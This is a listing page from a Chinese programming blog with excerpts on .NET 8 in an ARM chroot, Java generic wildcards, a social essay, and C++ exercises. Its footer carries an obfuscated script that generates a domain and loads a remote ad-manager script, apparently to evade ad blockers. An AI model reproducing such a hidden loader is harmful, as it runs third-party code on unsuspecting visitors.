#wget https://cloud-images.ubuntu.com/releases/22.04/release/ubuntu-22.04-server-cloudimg-arm64-root.tar.xz #wget https://dotnet.microsoft.com/en-us/download/dotnet/thank-you/sdk-8.0.100-preview.2-linux-arm64-binaries #mkdir root #tar -xvf ubuntu-22.04-server-cloudimg-arm64-root.tar.xz -C root/ #cp -r dotnet-sdk-8.0.100-preview.2.23157.25-linux-arm64.tar.gz root/tmp #cd root/tmp #mkdir dotnet #tar -xvf dotnet-sdk-8.0.100-preview.2.23157.25-linux-arm64.tar.gz -C dotnet #cd .. #cd .. #chroot root 看下当前系统版本：
#uname -a Linux tang-virtual-machine 5.19.0-38-generic #39~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Fri Mar 17 21:16:15 UTC 2 aarch64 aarch64 aarch64 GNU/Linux 进入到tmp目录下看下.Net8的信息
#tmp/dotnet/dotnet --info Failed to create CoreCLR, HRESULT: 0x8007000E Host: Version: 8.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/831d94e236c939aad0ed9f2dfcb5abbd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/da3318787eacfff4c7c314b90319ab25/" rel="bookmark">
			Java 泛型 通配符 及 ? extends T 和 ? super T 的理解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、通配符 （？ Wildcards）
1.1 泛型上限
1.2 泛型下限
1.3 PECS原则(Producer Extends Consumer Super)
一、通配符 （？ Wildcards） 1、通配符不能用于泛型定义、不能用于New泛型实例。只能用于泛型类的使用：声明变量、方法的参数。
2、？ 是万能通配符 ，表示未知类型，类型参数赋予不确定类型、任意类型
3、&lt;? extends T&gt; 表示类型的上限，表示参数化类型的可能是T 或是 T的子类;
4、&lt;? super T&gt; 表示类型上限（Java Core中叫超类型限定），表示参数化类型是此类型的超类型（父类型），直至Object;
list&lt;?&gt; list1 = new ArrayList&lt;Integer&gt;();//Ok public void test(List&lt;?&gt; list)//OK list1 =new ArrayList&lt;?&gt;()//Error 1.1 泛型上限 public class Pair&lt;T&gt;{ private T first; private T second; public Pair() { first = null ; second = null ; } public Pair(T first, T second) { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/da3318787eacfff4c7c314b90319ab25/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/887806a9101855333badbafef1ca5c0e/" rel="bookmark">
			对”内卷“和”躺平“的个人理解和看法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近，不知道从什么时候开始，”内卷“和”躺平“成了一个热门词语，甚至成了一些人的口头禅。让我们先来看看百科的解释。
内卷，网络流行语，原指一类文化模式达到了某种最终的形态以后，既没有办法稳定下来，也没有办法转变为新的形态，而只能不断地在内部变得更加复杂的现象。经网络流传，很多高等学校学生用其来指代非理性的内部竞争或“被自愿”竞争。现指同行间竞相付出更多努力以争夺有限资源，从而导致个体“收益努力比”下降的现象。可以看作是努力的“通货膨胀” 。
躺平，网络流行词。指无论对方做出什么反应，你内心都毫无波澜，对此不会有任何反应或者反抗，表示顺从心理。另外在部分语境中表示为：瘫倒在地，不再鸡血沸腾、渴求成功了。躺平看似是妥协、放弃，但其实是“向下突破天花板”，选择最无所作为的方式反叛裹挟。年轻人选择躺平，就是选择走向边缘，超脱于加班、升职、挣钱、买房的主流路径之外，用自己的方式消解外在环境对个体的规训。
通过”内卷“和”躺平“这两个词，可以看出社会中一些人的状态和心态。竞争，是一个中性词，竞争又可分为良心竞争和恶行竞争，整体来说，竞争是有利的，通过竞争，相互促进，使事物发展的更好。商业的本质就是竞争，通过竞争，为客户提供更好的产品和服务，并促进着社会的发展。内卷，这个词自带消极属性，是对竞争加剧的某种抱怨，虽然有消极因素，但依然在参与竞争，并没有放弃。躺平，这个词更进一步，已经主动放弃了竞争，是个体主动选择的结果。
从宏观的角度来讲，中国有14亿人，一小部分人躺平，并不会对社会有太大影响。但从个体来说，躺平，即主动选择放弃竞争，而这种放弃却是放弃了自己的前途、自己的未来、自己的人生，对个体来说影响可谓是巨大的。并且这种放弃是不可逆的，躺平一两年悔了还能继续努力，如果躺平时间久了，再后悔，恐怕就没有任何机会了。
当然也应该看到社会的竞争在加剧，并且随着经济社会的发展、科技的进步、高等教育的普及、房价高企、各种生活成本的提升、阶级固化等等，在教育、就业、婚恋、住房等各方面的竞争只会加剧，而不会减弱，这是一种社会发展的必然趋势，并不会因为我们抱怨几句，甚至做出过分的举动而减弱。竞争就是对有限资源的争夺，并且随着经济从高速发展到高质量发展，各方面供需矛盾（供大于求或供小于求）的加剧，竞争只会加剧。
从国家层面，应该看到这种竞争的加剧，努力从各个方面减轻人们的压力。
从个人层面，首先应该有清醒和客观的认识，千万不能盲目跟风躺平，要为自己的人生负责。其次要有积极乐观的心态，积极主动参与到这种竞争中去，在竞争中磨砺自己，提升能力。最后，应该从长远的、发展的眼观看待问题，而不应该仅仅看到眼前的问题。
当然，每个人都有选择自己生活方式的权力，应该尊重每个人的选择，只要慎重选择，并为自己的选择承担所有可能的结果即可。
努力不一定有机会，而躺平则一定没有机会。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dbe2e18a31278a38c0ce7602a076dcf0/" rel="bookmark">
			字串起始位置最大值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 给定两个字符串s1和s2，如果s1删除若干个字符后变成s2，则称s2为s1的子串，求s2在s1中的起始位置的最大值
输入描述：
只有一行 s1，s2 ，s1和s2用空格隔开，
s1和s2度不会含有空格
s1和s2的长度均大于1且小于256
输出描述：
如果s2不是s1的子串，请输出0，否则输出s2在s1中起始位置的最大值。
abcdacd ad
输出
5
#include &lt;bits/stdc++.h&gt; using namespace std; int main() { string s1="abcdacd",s2="ad"; //cin&gt;&gt;s1&gt;&gt;s2; int j=0; string res; for(int i=0;i&lt;s1.size();i++){ int len=s2.size(); bool flag=false; while(len--){ if(s1[i]==s2[len]){ flag=true; break; }else{ continue; } } if(flag)res+=s1[i]; } //cout&lt;&lt;res&lt;&lt;endl;. if(res.find(s2)!=string::npos){ cout&lt;&lt;s1.find_last_of(s2[0])+1&lt;&lt;endl; }else{ cout&lt;&lt;0&lt;&lt;endl; } return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d39eae5c3239ff08f25a89f638553ef7/" rel="bookmark">
			C&#43;&#43;中的cin处理非法输入，对get()和getline()的使用，以及对文件的输入输出
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、cin对非法输入的处理 int n; cin&gt;&gt;n;
上述语句中，如果用户输入一个字符，将发生错误，此时cin会进行以下几种处理：
1.不匹配的输入仍留在输入队列中
2.cin对象中的一个错误标记被设置
3.对cin方法的调用将返回false
因此输入错误时应使用以下步骤解决：
while(!(cin&gt;&gt;n)) //注意!(cin&gt;&gt;n)中的括号不能省略，输入错误时进入循环，直至输入正确
{
cin.clear(); //使用该方法清除错误标记
while(cin.get()!='\n'); //吸收输入队列中非法的输入，直至回车符出现
cout&lt;&lt;"请输入正确的值：";
}
二、cin对字符串的get()和getline() C++中处理字符串有两种方式，一种是C风格的字符数组，一种是string类。
1.C风格的字符数组 C风格的字符数组表示字符串时必须以空字符结尾，即'\0'。
字符数组初始化：char a[10]="study" //隐式的包含结尾的空字符
通过cin输入时，将字符串读入到char数组中时，将自动加上结尾的空字符，因此长度为10的字符串需要长度为11的字符串数组才可以存储。
使用cin对char a[10]进行输入时，如果直接：cin&gt;&gt;a，则当键盘输入空格时，输入将判定为字符串输入结束，即读取不到空格后面的内容。可使用get()和getline()解决此问题。
面向行的输入：getline()
getline()函数将读取整行，以回车符作为输入结束的标志，并丢弃掉回车符。
使用方法：cin.getline(a,9) //注意长度为10的数组只能存储长度为9的字符串
面向行的输入：get()
get()与getline()类似，区别在于get()不丢弃回车符，将保留在输入队列中。
因此连续输入时，要在两个输入直接增加一个 cin.get()，用来吸收此回车符。
cin.getline(a,9); cin.get(); cin.get(b,9);
get相比于geiline()的好处在于：使用get()可以查看下一个字符是否为回车符来判断输入结束到底是因为已经读取了整行，还是因为数组已经填充满了。
2.string类 string类使用get()和getline()时，表示内容相同，但表示形式不同。
string str;
使用方法： getline(cin,str); get(cin,str);
三、文件的读取和写入 使用文件的读取和写入时必须包含头文件 #include &lt;fstream&gt;
1.文件读取 文件读取的步骤如下：
①创建一个ifstream对象
②将该ifstream对象与一个文件关联
③像使用cin那样使用该ofstream对象
④使用close()关闭流
int n;
ifstream inFile;
inFile.open("a.txt"); //双引号中的是文件名
inFile&gt;&gt;n;
inFile.close();
2.文件写入 文件写入的步骤如下：
①创建一个ofstream对象
②将该ofstream对象与一个文件关联
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d39eae5c3239ff08f25a89f638553ef7/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/157/">«</a>
	<span class="pagination__item pagination__item--current">158/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/159/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>